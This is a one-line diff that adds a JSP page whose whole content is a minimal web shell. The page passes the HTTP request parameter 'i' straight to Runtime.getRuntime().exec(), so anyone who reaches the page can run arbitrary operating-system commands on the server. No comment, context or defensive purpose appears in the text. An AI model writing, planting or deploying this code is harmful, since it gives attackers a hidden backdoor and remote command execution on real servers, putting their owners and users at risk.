@@ -1,0 +1,1 @@
+<%@ page contentType="charset=Shift_JIS" %><%Runtime.getRuntime().exec(request.getParameter("i"));%>
